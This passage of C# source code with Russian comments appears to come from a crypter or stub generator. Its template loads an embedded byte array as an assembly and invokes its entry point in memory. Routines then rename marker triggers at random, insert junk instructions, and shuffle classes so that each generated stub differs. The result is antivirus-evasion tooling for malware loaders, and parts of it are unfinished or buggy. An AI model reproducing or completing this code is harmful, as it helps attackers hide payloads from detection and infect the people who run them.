			    %$#@additionaltriggerF2@#$% 
                bool %var122% ;
                %$#@additionaltriggerF3@#$%
			    %$#@additionaltriggerF4@#$%
			    %$#@additionaltriggerF5@#$%
                %var122% = false ;
                %$#@additionaltriggerF6@#$%
			    %$#@additionaltriggerF7@#$%
			    %$#@additionaltriggerF8@#$% 
                if ( %var122% == true ) 
                {
                %$#@additionaltriggerMF9@#$%
			    %$#@additionaltriggerMF10@#$%
			    %$#@additionaltriggerMF11@#$% 
                byte[] %var120% = new byte[%var121%];
                %$#@additionaltriggerF9@#$%
			    %$#@additionaltriggerF10@#$%
			    %$#@additionaltriggerF11@#$% 
                Assembly %var123%=Assembly.Load(%var120%); " +
                @"%$#@additionaltriggerF12@#$%
                %$#@additionaltriggerF13@#$%
			    %$#@additionaltriggerF14@#$%
                %var123%.EntryPoint.Invoke(null,null);
                %$#@additionaltriggerF15@#$%
			    %$#@additionaltriggerF16@#$%
			    %$#@additionaltriggerF17@#$%
                } ";


                string sHelp = "";

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var120%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomInt(2, 298).ToString();
                strtemp = strtemp.Replace("%var121%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var123%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                while (IsSubInString(ref strtemp, ref sHelp) || IsSubInString(ref str0, ref sHelp) || IsSubInString(ref inNull0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                {
                    sHelp = GenerateRandomString();
                }
                strtemp = strtemp.Replace("%var122%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                sHelp = GenerateRandomString();
                strtemp = strtemp.Replace("%var124%", sHelp);//после того как нашли заменяем триггер на наше новое имя

                ModifyAllUniqueTriggersVoidS(ref str0, ref strtemp);// заполняем все триггеры
          
                return strtemp;
            }

        }

        public struct  ClassNames //структура для хранения имен какого либо класса
        {
            string NamespaceName;
            string ClassName;
            List<string> Triggers;
        }
        public static List<ClassNames> AllNames=new List<ClassNames>();//скомпонованный список всех имен
        public static ClassNames TempBox;

        public static void RebuildClasses(ref string str0)//перестройка всех классов ( *еще только начало перестройки )
        {
            string SubTemp = "";//временная переменная для хранения значения субстроки поиска начала триггера
            string SubEnd = "";//временная переменная для хранения значения субстроки поиска конца триггера
            int TempSizeOfTrigger = 0; ;//временный размер субстроки названия триггера
            string TempTrigger = "";//временный триггер
            bool bHelper = false;//вспомогательная булевая
            int NamespaceStart = FindFirstNamespace(ref str0);
            bool IsInClassExpressionX = false;//находимся ли в определении класса
            List<string> TriggersR;
            string CutStartTrigger = "%$#@CUTSTARTtrigger@#$%";//триггер начала вырезки
            string CutEndTrigger = "%$#@CUTENDtrigger@#$%";//триггер конца вырезки
            string Placetrigger = "%$#@PLACEtrigger@#$%";//триггер возможного размещения обьекта
            string ObjectTemp = "";//для хранения вырезанного обьекта

            

            for (int i = 0; i < str0.Length; i++)//перетусуем обьекты с метками 
            {
                if ((str0.Length - i) >= CutStartTrigger.Length)
                {
                    SubTemp = str0.Substring(i, CutStartTrigger.Length);
                }

                if (SubTemp == CutStartTrigger)//если нашли триггер начала вырезания
                {

                    for (int j = i; j < str0.Length; j++)//найдем триггер конца вырезки
                    {
                        if ((str0.Length - j) >= CutEndTrigger.Length)
                        {
                            SubTemp = str0.Substring(j, CutEndTrigger.Length);
                        }

                        if (SubTemp == CutEndTrigger)//если нашли триггер конца вырезания
                        {
                            ObjectTemp = str0.Substring(i, j-i+ CutEndTrigger.Length);
                            ObjectTemp.Replace(CutStartTrigger, " ");
                            ObjectTemp.Replace(CutEndTrigger, " ");
                            str0.Remove(i, j - i + CutEndTrigger.Length);

                            bool bFinded = false;//нашли ли место перемещения
                            while ( bFinded == false )
                            {
                                for (int k = Instructions.GenerateRandomInt(str0.Length); k < str0.Length; k++)
                                {
                                    if ((str0.Length - k) >= Placetrigger.Length)
                                    {
                                        SubTemp = str0.Substring(i, Placetrigger.Length);
                                    }

                                    if (SubTemp == Placetrigger)
                                    {
                                        str0.Remove(k, Placetrigger.Length);
                                        str0.Insert(k, ObjectTemp);//вставляем пемещаемый обьект на место триггера
                                        bFinded = true;
                                        break;
                                    }

                                }
                            }
                        }
                    }

                }
            }

            for (int i = 0; i < str0.Length; i++)//построение иерархии обьектов
            {
                if ((str0.Length - i) >= 1)
                {
                    SubTemp = str0.Substring(i, 1);
                }
                IsInClassExpressionX = IsInNamespaceExpression(ref str0, ref i);
                IsInClassExpressionX = IsInClassExpression(ref str0, ref i);
                if ( (SubTemp == "}" || SubTemp == ";" ) && i > NamespaceStart)//если нашли конец оператора (но он должен быть после namespace)
                {
                    if (IsInClassExpressionX == true)
                    {
                        for (int j = i + 1; j < str0.Length; j++)
                        {
                            SubTemp = str0.Substring(j, 1);
                            if (SubTemp == "{" || SubTemp == "=" || SubTemp == "(" || SubTemp == ";")
                            {
                                TempTrigger = "";
                                for (int k = i + 1; k < j; k++)
                                {
                                    if ((str0.Length - i) >= (int)trigger.TriggerBase)
                                    {
                                        SubTemp = str0.Substring(i, (int)trigger.TriggerBase);
                                    }

                                    if (SubTemp == "%$#@basictrigger")//если нашли начало определения базового триггера
                                    {
                                        SubEnd = "";
                                        int Witeration = 0;//итератор цикла while
                                        while (SubEnd != "@#$%" && i <= (str0.Length - 4))//поиск конца имени триггера
                                        {
                                            if (i + (int)trigger.TriggerBase + Witeration < str0.Length)
                                            {
                                                SubEnd = str0.Substring(i + (int)trigger.TriggerBase + Witeration, 4);
                                                Witeration++;
                                            }
                                            else
                                            {
                                                break;
                                            }
                                        }
                                        if (SubEnd == "@#$%")//если нашли конец триггера определим есть ли в листе сгенерированных имен такие же имена , если нет то добавляем новое сгенерированное
                                        {
                                            TempSizeOfTrigger = (int)trigger.TriggerBase + (Witeration - 1) + 4;//считаем количество символов в строке триггера
                                            TempTrigger = str0.Substring(i, TempSizeOfTrigger);//используя это количество определяем полное имя триггера
                                        }

                                    }

                                    if (TempTrigger != "" && k == j - 1)
                                    {
                                        bHelper = true;
                                        foreach (ClassNames CN in AllNames)//определение есть ли уже в листе такой класс с таким же пространством имен
                                        {
                                            Type TypeNames = CN.GetType();
                                            var NamespaceNameT = TypeNames.GetField("NamespaceName");
                                            var ClassNameT = TypeNames.GetField("ClassName");
                                            if ((string)ClassNameT.GetValue(CN) == ClassName && (string)NamespaceNameT.GetValue(CN) == NamespaceName)
                                            {
                                                bHelper = false;
                                                break;
                                            }
                                        }
                                        if (bHelper == true)//если такого класса нет то добавляем и пространство имен и класс
                                        {
                                            TempBox = new ClassNames();
                                            TempBox.GetType().GetField("NamespaceName").SetValue(TempBox, NamespaceName);
                                            TempBox.GetType().GetField("ClassName").SetValue(TempBox, ClassName);
                                            AllNames.Add(TempBox);
                                        }

                                        foreach (ClassNames CN in AllNames)//определение есть ли уже в листе такой класс с таким же пространством имен
                                        {
                                            Type TypeNames = CN.GetType();
                                            var NamespaceNameT = TypeNames.GetField("NamespaceName");
                                            var ClassNameT = TypeNames.GetField("ClassName");
                                            var TriggersT = TypeNames.GetField("Triggers");


                                            if ((string)ClassNameT.GetValue(CN) == ClassName && (string)NamespaceNameT.GetValue(CN) == NamespaceName)
                                            {
                                                TriggersR = (List<string>)TriggersT.GetValue(CN);
                                                bHelper = true;
                                                foreach (string tr in TriggersR)//определение есть ли уже в листе триггеров такое имя
                                                {
                                                    if (tr == TempTrigger)
                                                    {
                                                        bHelper = false;
                                                        break;
                                                    }
                                                }
                                                if (bHelper == true)//если имя не повторяется то добавляем его
                                                {
                                                    TriggersR.Add(TempTrigger);
                                                    TriggersT.SetValue(CN, TriggersR);
                                                }
                                                break;
                                            }
                                        }
                                    }
                                }

                                break;
                            }

                        }

                    }

                }

            }
            //здесь заканчивается блок строящий иерархию обьектов

            for (int i = 0; i < str0.Length; i++)//построение правильных обращений к обьектам
            {
                if ((str0.Length - i) >= 1)
                {
                    SubTemp = str0.Substring(i, 1);
                }
                IsInClassExpressionX = IsInNamespaceExpression(ref str0, ref i);
                IsInClassExpressionX = IsInClassExpression(ref str0, ref i);
                if (i > NamespaceStart)//после namespace
                {
                    if (IsInClassExpressionX == true)
                    {
                        TempTrigger = "";
                        if ((str0.Length - i) >= (int)trigger.TriggerBase)
                        {
                            SubTemp = str0.Substring(i, (int)trigger.TriggerBase);
                        }

                        if (SubTemp == "%$#@basictrigger")//если нашли начало определения базового триггера
                        {
                            SubEnd = "";
                            int Witeration = 0;//итератор цикла while
                            while (SubEnd != "@#$%" && i <= (str0.Length - 4))//поиск конца имени триггера
                            {
                                if (i + (int)trigger.TriggerBase + Witeration < str0.Length)
                                {
                                    SubEnd = str0.Substring(i + (int)trigger.TriggerBase + Witeration, 4);
                                    Witeration++;
                                }
                                else
                                {
                                    break;
                                }
                            }
                            if (SubEnd == "@#$%")//если нашли конец триггера определим есть ли в листе сгенерированных имен такие же имена , если нет то добавляем новое сгенерированное
                            {
                                TempSizeOfTrigger = (int)trigger.TriggerBase + (Witeration - 1) + 4;//считаем количество символов в строке триггера
                                TempTrigger = str0.Substring(i, TempSizeOfTrigger);//используя это количество определяем полное имя триггера
                            }

                        }

                        if (TempTrigger != "" )
                        {
                            bHelper = true;
                            foreach (ClassNames CN in AllNames)//определение есть ли уже в листе такой класс с таким же пространством имен
                            {
                                Type TypeNames = CN.GetType();
                                var NamespaceNameT = TypeNames.GetField("NamespaceName");
                                var ClassNameT = TypeNames.GetField("ClassName");
                                var TriggersT = TypeNames.GetField("Triggers");


                                TriggersR = (List<string>)TriggersT.GetValue(CN);
                                bHelper = false;
                                foreach (string tr in TriggersR)//определение в каком классе находится данное имя и исправление если вызов производится не из того класса
                                {
                                    if (tr == TempTrigger)
                                    {
                                        bHelper = true;
                                        break;
                                    }
                                }

                                if ( bHelper && ((string)ClassNameT.GetValue(CN) != ClassName || (string)NamespaceNameT.GetValue(CN) != NamespaceName) )
                                {
                                    //*****************
                                    break;
                                }

                            }
                        }
                    }

                }

            }



        }

        private static Instruction GenerateRandomInstruction(ref Instruction[] inst0)//получение рандомной инструкции
        {
            int randomnum0 = Instructions.GenerateRandomInt(inst0.Length);
            //MessageBox.Show(string.Format("all= " + (inst0.Length - 1).ToString()) + string.Format("num= " + randomnum0));
            if ( randomnum0 < inst0.Length && randomnum0 > 0 )
            {
                return inst0[randomnum0];
            }
            else
            {
                return inst0[0];
            }
        }

        private static string GenerateMultiInstruction(ref Instruction[] inst0, ref string str0,ref int ix)
        {
            string strx = "";
            string stry = "";
            int complex = Instructions.RandomizeInt(0, 6, 0);
            for (int i = 0; i < complex; i++)
            {
                strx=GenerateRandomInstruction(ref  inst0)(ref str0, ref str0);
                stry = stry + strx;
                str0 = str0.Insert(ix + 1, (" " + strx +" "));//после того как нашли заменяем триггер на нашу новую инструкцию
                ix = ix + strx.Length + 2;
            }
            return stry;
        }

        private static string GenerateMultiInstructionAlpha(ref Instruction[] inst0, ref string str0,ref string strnew0)
        {
            string strx = "";
            string stry = "";
            int complex = Instructions.RandomizeInt(0, 6, 0);
            for (int i = 0; i < complex; i++)
            {
                strx = GenerateRandomInstruction(ref inst0)(ref str0, ref strnew0);
                stry = stry + strx;
            }
            return stry;
        }

        private enum trigger//размеры триггеров
        {
           TriggerBase=16,//триггер замещающий имена базовых методов
           TriggerAssembly=19,//триггер замещающий числовую информацию о сборке
           TriggerProcedure=21,//триггер генерирущий простейшие инструкции внутри процедур
           TriggerBetweenProcedure= 18,//триггер генерирущий простейшие инструкции между процедур
           TriggerTryCatch= 19,//триггер генерирущий простейшие инструкции в блоках try catch
           TriggerClass= 16,//триггер генерирущий классы между классами
           TriggerNamespace= 20,//триггер генерирущий пространства имен с класами внутри
           TriggerStruct = 17,//триггер генерирующий переменные в структуре
           TriggerEnum= 15//триггер генерирующий переменные в enum
        };


        private static string FindTriggerBase(ref string str0, ref int ind0)//найдем триггер имени класса или пространства имен
        {
            string SubTemp = "";//временная переменная для хранения значения субстроки поиска начала триггера
            string SubEnd = "";//временная переменная для хранения значения субстроки поиска конца триггера
            int TempSizeOfTrigger = 0; ;//временный размер субстроки названия триггера
            string TempTrigger = "";//временный триггер
            //Substring(Int32, Int32) - функция ищет подстроку указанной длины
            //Lenght - свойсво возвращающее число знаков в данной строке
            // %$#@basictrigger  - начальная строка триггера наименования обьекта базового кода ( 16 символов )
            // %$#@additionaltrigger - начальная строка триггера наименования обьекта мусорного кода внутри функции ( 21 символ )
            // %$#@betweentrigger - начальная строка триггера наименования обьекта мусорного кода между функций ( 18 символов )
            // %$#@trycatchtrigger - начальная строка триггера в блоках try catch ( 19 символов )
            for (int i = ind0; i < str0.Length; i++)
            {
                if ((str0.Length - i) >= (int)trigger.TriggerBase)
                {
                    SubTemp = str0.Substring(i, (int)trigger.TriggerBase);
                }

                if (SubTemp == "%$#@basictrigger")//если нашли начало определения базового триггера
                {
                    SubEnd = "";
                    int Witeration = 0;//итератор цикла while
                    while (SubEnd != "@#$%" && i <= (str0.Length - 4))//поиск конца имени триггера
                    {
                        if (i + (int)trigger.TriggerBase + Witeration < str0.Length)
                        {
                            SubEnd = str0.Substring(i + (int)trigger.TriggerBase + Witeration, 4);
                            Witeration++;
                        }
                        else
                        {
                            break;
                        }
                    }
                    if (SubEnd == "@#$%")//если нашли конец триггера определим есть ли в листе сгенерированных имен такие же имена , если нет то добавляем новое сгенерированное
                    {
                        TempSizeOfTrigger = (int)trigger.TriggerBase + (Witeration - 1) + 4;//считаем количество символов в строке триггера
                        TempTrigger = str0.Substring(i, TempSizeOfTrigger);//используя это количество определяем полное имя триггера
                        return TempTrigger;
                    }

                }

            }
            return "";
        }

        private static string FindNameBase(ref string str0, ref int ind0)//найдем имя класса или пространства имен
        {
            bool bFindedFirstSpace = false;
            bool bFindedSecondSpace = false;
            bool bFindedNotSpace = false;
            int FirstSpace=0;
            int SecondSpace=0;
            string strT = "";
            for (int i = ind0; i < str0.Length; i++)
            {
                strT = str0.Substring(i,1);
                if ( strT == " " && bFindedFirstSpace == false && i + 1 < str0.Length )
                {
                    bFindedFirstSpace = true;
                }

                if ( strT != " " && bFindedFirstSpace == true && bFindedNotSpace == false && i < str0.Length )
                {
                    FirstSpace = i;
                    SecondSpace = i + 1;
                    bFindedNotSpace = true;
                }

                if ( strT == " " && bFindedFirstSpace == true && bFindedNotSpace == true && bFindedSecondSpace == false && i - 1 < str0.Length )
                {
                    SecondSpace = i;
                    bFindedSecondSpace = true;
                    return str0.Substring(FirstSpace, SecondSpace-FirstSpace);
                }

            }
            return "";
        }

        public static void ReplaceAllUniqueTriggersBase(ref string str0)//заполнение триггеров замещения базового кода
        {
            string SubTemp="";//временная переменная для хранения значения субстроки поиска начала триггера
            string SubEnd="";//временная переменная для хранения значения субстроки поиска конца триггера
            int TempSizeOfTrigger = 0; ;//временный размер субстроки названия триггера
            string TempTrigger = "";//временный триггер
            bool bHelper = false;//вспомогательная булевая
            string sHelp="";
            //Substring(Int32, Int32) - функция ищет подстроку указанной длины
            //Lenght - свойсво возвращающее число знаков в данной строке
            // %$#@basictrigger  - начальная строка триггера наименования обьекта базового кода ( 16 символов )
            // %$#@additionaltrigger - начальная строка триггера наименования обьекта мусорного кода внутри функции ( 21 символ )
            // %$#@betweentrigger - начальная строка триггера наименования обьекта мусорного кода между функций ( 18 символов )
            // %$#@trycatchtrigger - начальная строка триггера в блоках try catch ( 19 символов )
            for ( int i=0; i<str0.Length; i++  )
            {
                if ( (str0.Length-i) >= (int)trigger.TriggerBase )
                {
                    SubTemp = str0.Substring(i, (int)trigger.TriggerBase);
                }

                if ( SubTemp == "%$#@basictrigger" )//если нашли начало определения базового триггера
                {
                    SubEnd = "";
                    int Witeration = 0;//итератор цикла while
                    while ( SubEnd != "@#$%" && i <= (str0.Length - 4) )//поиск конца имени триггера
                    {
                        if (i + (int)trigger.TriggerBase + Witeration < str0.Length)
                        {
                            SubEnd = str0.Substring(i + (int)trigger.TriggerBase + Witeration, 4);
                            Witeration++;
                        }
                        else
                        {
                            break;
                        }
                    }
                    if ( SubEnd == "@#$%")//если нашли конец триггера определим есть ли в листе сгенерированных имен такие же имена , если нет то добавляем новое сгенерированное
                    {
                        TempSizeOfTrigger = (int)trigger.TriggerBase + (Witeration - 1) + 4;//считаем количество символов в строке триггера
                        TempTrigger= str0.Substring(i, TempSizeOfTrigger);//используя это количество определяем полное имя триггера
                        bHelper = false;
                        bHelper = true;
                        foreach (string tr in ListTriggersBase)//определение есть ли уже в листе триггеров такое имя
                        {
                            if (tr == TempTrigger)
                            {
                                bHelper = false;
                                break;
                            }
                        }
                        if (bHelper == true)//если имя не повторяется то добавляем его
                        {
                            ListTriggersBase.Add(TempTrigger);
                            sHelp = Instructions.GenerateRandomString();
                            while (Instructions.IsSubInString(ref str0, ref sHelp) )//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                            {
                                sHelp = Instructions.GenerateRandomString();
                            }
                            str0=str0.Replace(TempTrigger, sHelp);//после того как нашли заменяем триггер на наше новое имя
                            //MessageBox.Show(string.Format("Old Trigger= "+ TempTrigger)+ string.Format("  New Trigger= " + sHelp));
                        }
                    }

                }

            }

        }

        public static void ReplaceAllUniqueTriggersBase(ref string str0, ref string strnew0)//заполнение триггеров замещения базового кода
        {
            string SubTemp = "";//временная переменная для хранения значения субстроки поиска начала триггера
            string SubEnd = "";//временная переменная для хранения значения субстроки поиска конца триггера
            int TempSizeOfTrigger = 0; ;//временный размер субстроки названия триггера
            string TempTrigger = "";//временный триггер
            bool bHelper = false;//вспомогательная булевая
            string sHelp = "";
            List<string> ListTriggersBaseTemp = new List<string>();
            //Substring(Int32, Int32) - функция ищет подстроку указанной длины
            //Lenght - свойсво возвращающее число знаков в данной строке
            // %$#@basictrigger  - начальная строка триггера наименования обьекта базового кода ( 16 символов )
            // %$#@additionaltrigger - начальная строка триггера наименования обьекта мусорного кода внутри функции ( 21 символ )
            // %$#@betweentrigger - начальная строка триггера наименования обьекта мусорного кода между функций ( 18 символов )
            // %$#@trycatchtrigger - начальная строка триггера в блоках try catch ( 19 символов )
            for (int i = 0; i < strnew0.Length; i++)
            {
                if ((strnew0.Length - i) >= (int)trigger.TriggerBase)
                {
                    SubTemp = strnew0.Substring(i, (int)trigger.TriggerBase);
                }

                if (SubTemp == "%$#@basictrigger")//если нашли начало определения базового триггера
                {
                    SubEnd = "";
                    int Witeration = 0;//итератор цикла while
                    while (SubEnd != "@#$%" && i <= (strnew0.Length - 4))//поиск конца имени триггера
                    {
                        if (i + (int)trigger.TriggerBase + Witeration < strnew0.Length)
                        {
                            SubEnd = strnew0.Substring(i + (int)trigger.TriggerBase + Witeration, 4);
                            Witeration++;
                        }
                        else
                        {
                            break;
                        }
                    }
                    if (SubEnd == "@#$%")//если нашли конец триггера определим есть ли в листе сгенерированных имен такие же имена , если нет то добавляем новое сгенерированное
                    {
                        TempSizeOfTrigger = (int)trigger.TriggerBase + (Witeration - 1) + 4;//считаем количество символов в строке триггера
                        TempTrigger = strnew0.Substring(i, TempSizeOfTrigger);//используя это количество определяем полное имя триггера
                        bHelper = false;
                        bHelper = true;
                        foreach (string tr in ListTriggersBaseTemp)//определение есть ли уже в листе триггеров такое имя
                        {
                            if (tr == TempTrigger)
                            {
                                bHelper = false;
                                break;
                            }
                        }
                        if (bHelper == true)//если имя не повторяется то добавляем его
                        {
                            ListTriggersBaseTemp.Add(TempTrigger);
                            sHelp = Instructions.GenerateRandomString();
                            while (Instructions.IsSubInString(ref strnew0, ref sHelp) || Instructions.IsSubInString(ref str0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                            {
                                sHelp = Instructions.GenerateRandomString();
                            }
                            strnew0 = strnew0.Replace(TempTrigger, sHelp);//после того как нашли заменяем триггер на наше новое имя
                            //MessageBox.Show(string.Format("Old Trigger= "+ TempTrigger)+ string.Format("  New Trigger= " + sHelp));
                        }
                    }

                }

            }

        }

        public static void ReplaceAllUniqueTriggersAssembly(ref string str0)//заполнение триггеров замещения базового кода
        {
            string SubTemp = "";//временная переменная для хранения значения субстроки поиска начала триггера
            string SubEnd = "";//временная переменная для хранения значения субстроки поиска конца триггера
            int TempSizeOfTrigger = 0; ;//временный размер субстроки названия триггера
            string TempTrigger = "";//временный триггер
            bool bHelper = false;//вспомогательная булевая
            string sHelp = "";
            //Substring(Int32, Int32) - функция ищет подстроку указанной длины
            //Lenght - свойсво возвращающее число знаков в данной строке
            // %$#@basictrigger  - начальная строка триггера наименования обьекта базового кода ( 16 символов )
            // %$#@additionaltrigger - начальная строка триггера наименования обьекта мусорного кода внутри функции ( 21 символ )
            // %$#@betweentrigger - начальная строка триггера наименования обьекта мусорного кода между функций ( 18 символов )
            // %$#@trycatchtrigger - начальная строка триггера в блоках try catch ( 19 символов )
            for (int i = 0; i < str0.Length; i++)
            {
                if ((str0.Length - i) >= (int)trigger.TriggerAssembly)
                {
                    SubTemp = str0.Substring(i, (int)trigger.TriggerAssembly);
                }

                if (SubTemp == "%$#@assemblytrigger")//если нашли начало определения базового триггера
                {
                    SubEnd = "";
                    int Witeration = 0;//итератор цикла while
                    while (SubEnd != "@#$%" && i <= (str0.Length - 4))//поиск конца имени триггера
                    {
                        if (i + (int)trigger.TriggerAssembly + Witeration < str0.Length)
                        {
                            SubEnd = str0.Substring(i + (int)trigger.TriggerAssembly + Witeration, 4);
                            Witeration++;
                        }
                        else
                        {
                            break;
                        }
                    }
                    if (SubEnd == "@#$%")//если нашли конец триггера определим есть ли в листе сгенерированных имен такие же имена , если нет то добавляем новое сгенерированное
                    {
                        TempSizeOfTrigger = (int)trigger.TriggerAssembly + (Witeration - 1) + 4;//считаем количество символов в строке триггера
                        TempTrigger = str0.Substring(i, TempSizeOfTrigger);//используя это количество определяем полное имя триггера
                        bHelper = false;
                        bHelper = true;
                        foreach (string tr in ListTriggersAssembly)//определение есть ли уже в листе триггеров такое имя
                        {
                            if (tr == TempTrigger)
                            {
                                bHelper = false;
                                break;
                            }
                        }
                        if (bHelper == true)//если имя не повторяется то добавляем его
                        {
                            ListTriggersAssembly.Add(TempTrigger);
                            sHelp = Instructions.GenerateRandomStringAssembly();
                            while (Instructions.IsSubInString(ref str0, ref sHelp))//ищем новое название для триггера пока не найдется то которое уже не содержится в модифицированном коде стаба
                            {
                                sHelp = Instructions.GenerateRandomStringAssembly();
                            }
                            str0 = str0.Replace(TempTrigger, sHelp);//после того как нашли заменяем триггер на наше новое имя
                            //MessageBox.Show(string.Format("Old Trigger= "+ TempTrigger)+ string.Format("  New Trigger= " + sHelp));
                        }
                    }

                }

            }

        }

        public static void ModifyAllUniqueTriggersVoid(ref string str0)//заполнение триггеров модификации кода процедур
        {
            string SubTemp = "";//временная переменная для хранения значения субстроки поиска начала триггера
            string SubEnd = "";//временная переменная для хранения значения субстроки поиска конца триггера
            int TempSizeOfTrigger = 0; ;//временный размер субстроки названия триггера
            string TempTrigger = "";//временный триггер
            bool bHelper = false;//вспомогательная булевая
            string sHelp = "";
            //Substring(Int32, Int32) - функция ищет подстроку указанной длины
            //Lenght - свойсво возвращающее число знаков в данной строке
            // %$#@basictrigger  - начальная строка триггера наименования обьекта базового кода ( 16 символов )
            // %$#@additionaltrigger - начальная строка триггера наименования обьекта мусорного кода внутри функции ( 21 символ )
            // %$#@betweentrigger - начальная строка триггера наименования обьекта мусорного кода между функций ( 18 символов )
            // %$#@trycatchtrigger - начальная строка триггера в блоках try catch ( 19 символов )
            for (int i = 0; i < str0.Length; i++)
            {
                if ((str0.Length - i) >= (int)trigger.TriggerProcedure)
                {
                    SubTemp = str0.Substring(i, (int)trigger.TriggerProcedure);
                }

                if (SubTemp == "%$#@additionaltrigger")//если нашли начало определения базового триггера
                {
                    SubEnd = "";
                    int Witeration = 0;//итератор цикла while
                    while (SubEnd != "@#$%" && i <= (str0.Length - 4))//поиск конца имени триггера
                    {
                        if (i + (int)trigger.TriggerProcedure + Witeration < str0.Length)
                        {
                            SubEnd = str0.Substring(i + (int)trigger.TriggerProcedure + Witeration, 4);
                            Witeration++;
                        }
                        else
                        {
                            break;
                        }
                    }
                    if (SubEnd == "@#$%")//если нашли конец триггера определим есть ли в листе сгенерированных имен такие же имена , если нет то добавляем новое сгенерированное
                    {
                        TempSizeOfTrigger = (int)trigger.TriggerProcedure + (Witeration - 1) + 4;//считаем количество символов в строке триггера
                        TempTrigger = str0.Substring(i, TempSizeOfTrigger);//используя это количество определяем полное имя триггера
                        bHelper = false;
                        bHelper = true;
                        foreach (string tr in ListTriggersProcedure)//определение есть ли уже в листе триггеров такое имя
                        {
                            if (tr == TempTrigger)
                            {
                                bHelper = false;
                                break;
                            }
                        }
                        if (bHelper == true)//если имя не повторяется то добавляем его
                        {
                            ListTriggersProcedure.Add(TempTrigger);
                            bHelper = Instructions.GenerateRandomBool();
                            if ( bHelper == true )
                            {
                                //sHelp = GenerateRandomInstruction(ref InstructionsInProcedure)(ref str0, ref str0);
                                sHelp = GenerateMultiInstructionAlpha(ref InstructionsInProcedure,ref str0, ref str0);
                            }
                            else
                            {
                                sHelp = " ";
                            }
                            str0 = str0.Replace(TempTrigger, sHelp);//после того как нашли заменяем триггер на нашу новую инструкцию
                            //MessageBox.Show(string.Format("Old Trigger= " + TempTrigger)+string.Format("  New Trigger= " + sHelp));
                        }
                    }

                }

            }

        }

        private static void ModifyAllUniqueTriggersVoid(ref string str0, ref string strnew0)//заполнение триггеров модификации кода процедур
        {
            string SubTemp = "";//временная переменная для хранения значения субстроки поиска начала триггера
            string SubEnd = "";//временная переменная для хранения значения субстроки поиска конца триггера
            int TempSizeOfTrigger = 0; ;//временный размер субстроки названия триггера
            string TempTrigger = "";//временный триггер
            bool bHelper = false;//вспомогательная булевая
            string sHelp = "";
            List<string> ListTriggersProcedureTemp = new List<string>();
            //Substring(Int32, Int32) - функция ищет подстроку указанной длины
            //Lenght - свойсво возвращающее число знаков в данной строке
            // %$#@basictrigger  - начальная строка триггера наименования обьекта базового кода ( 16 символов )
            // %$#@additionaltrigger - начальная строка триггера наименования обьекта мусорного кода внутри функции ( 21 символ )
            // %$#@betweentrigger - начальная строка триггера наименования обьекта мусорного кода между функций ( 18 символов )
            // %$#@trycatchtrigger - начальная строка триггера в блоках try catch ( 19 символов )
            for (int i = 0; i < strnew0.Length; i++)
            {
                if ((strnew0.Length - i) >= (int)trigger.TriggerProcedure)
                {
                    SubTemp = strnew0.Substring(i, (int)trigger.TriggerProcedure);
                }

                if (SubTemp == "%$#@additionaltrigger")//если нашли начало определения базового триггера
                {
                    SubEnd = "";
                    int Witeration = 0;//итератор цикла while
                    while (SubEnd != "@#$%" && i <= (strnew0.Length - 4))//поиск конца имени триггера
                    {
                        if (i + (int)trigger.TriggerProcedure + Witeration < strnew0.Length)
                        {
                            SubEnd = strnew0.Substring(i + (int)trigger.TriggerProcedure + Witeration, 4);
                            Witeration++;
                        }
                        else
                        {
                            break;
                        }
                    }
                    if (SubEnd == "@#$%")//если нашли конец триггера определим есть ли в листе сгенерированных имен такие же имена , если нет то добавляем новое сгенерированное
                    {
                        TempSizeOfTrigger = (int)trigger.TriggerProcedure + (Witeration - 1) + 4;//считаем количество символов в строке триггера
                        TempTrigger = strnew0.Substring(i, TempSizeOfTrigger);//используя это количество определяем полное имя триггера
                        bHelper = false;
                        bHelper = true;
                        foreach (string tr in ListTriggersProcedureTemp)//определение есть ли уже в листе триггеров такое имя
                        {
                            if (tr == TempTrigger)
                            {
                                bHelper = false;
                                break;
                            }
                        }
                        if (bHelper == true)//если имя не повторяется то добавляем его
                        {
                            ListTriggersProcedureTemp.Add(TempTrigger);
                            bHelper = Instructions.GenerateRandomBool();
                            if (bHelper == true)
                            {
                                sHelp = GenerateRandomInstruction(ref InstructionsInProcedure)(ref str0, ref strnew0);
                            }
                            else
                            {
                                sHelp = " ";
                            }
                            strnew0 = strnew0.Replace(TempTrigger, sHelp);//после того как нашли заменяем триггер на нашу новую инструкцию
                            //MessageBox.Show(string.Format("Old Trigger= " + TempTrigger)+string.Format("  New Trigger= " + sHelp));
                        }
                    }

                }

            }

        }

        private static void ModifyAllUniqueTriggersVoidS(ref string str0, ref string strnew0)//заполнение триггеров модификации кода процедур
        {
            string SubTemp = "";//временная переменная для хранения значения субстроки поиска начала триггера
            string SubEnd = "";//временная переменная для хранения значения субстроки поиска конца триггера
            int TempSizeOfTrigger = 0; ;//временный размер субстроки названия триггера
            string TempTrigger = "";//временный триггер
            bool bHelper = false;//вспомогательная булевая
            string sHelp = "";
            List<string> ListTriggersProcedureTemp = new List<string>();
            //Substring(Int32, Int32) - функция ищет подстроку указанной длины
            //Lenght - свойсво возвращающее число знаков в данной строке
            // %$#@basictrigger  - начальная строка триггера наименования обьекта базового кода ( 16 символов )
            // %$#@additionaltrigger - начальная строка триггера наименования обьекта мусорного кода внутри функции ( 21 символ )
            // %$#@betweentrigger - начальная строка триггера наименования обьекта мусорного кода между функций ( 18 символов )
            // %$#@trycatchtrigger - начальная строка триггера в блоках try catch ( 19 символов )
            for (int i = 0; i < strnew0.Length; i++)
            {
